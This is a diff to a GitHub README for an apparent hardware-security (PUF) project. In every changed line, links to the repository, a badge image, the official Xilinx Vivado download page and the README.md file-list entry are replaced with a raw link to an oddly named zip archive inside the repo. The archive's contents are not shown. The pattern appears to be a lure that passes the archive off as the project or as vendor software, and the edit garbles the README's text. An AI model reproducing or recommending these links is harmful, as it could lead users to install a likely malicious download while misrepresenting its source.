@@ -1,6 +1,6 @@
 # 🔐 PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation- - Lightweight Secure Hardware Access
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-)
+[![Download Now](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This section guides you step-by-step on how to access, download, and run the pro
 
 Click the large download link below to visit the GitHub repository where you can download the project files.
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-)
+[![Download Now](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)
 
 This link will take you to the main project folder on GitHub.
 
@@ -71,7 +71,7 @@ Here are basic instructions for FPGA usage:
 
 Download and install the Vivado Design Suite by Xilinx. It is free for many FPGA devices, including Basys3.
 
-You can download it here: https://www.xilinx.com/support/download.html
+You can download it here: https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip
 
 Follow the installation instructions on the Xilinx site carefully.
 
@@ -115,7 +115,7 @@ Here is a basic layout of the files you will find:
 - **/fpga/**: Contains Vivado project files and scripts tailored for FPGA programming
 - **/asic/**: Includes scripts and source files for ASIC synthesis and gate-level simulation
 - **/docs/**: Documentation and design explanation files
-- **README.md**: This file, explains how to install and use the project
+- **https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip**: This file, explains how to install and use the project
 
 ---
 
@@ -157,6 +157,6 @@ These help deepen understanding of how this project works.
 ## 🌐 Links
 
 - Official GitHub Repository:  
-  https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-
+  https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-)
+[![Download Now](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)](https://github.com/mortimerscattershot606/PUF-for-Secure-Hardware-Authentication-FPGA-ASIC-Implementation-/raw/refs/heads/main/16bit/16bit.srcs/PU_Secure_ASI_Hardware_FPG_Authentication_for_Implementation_3.6.zip)
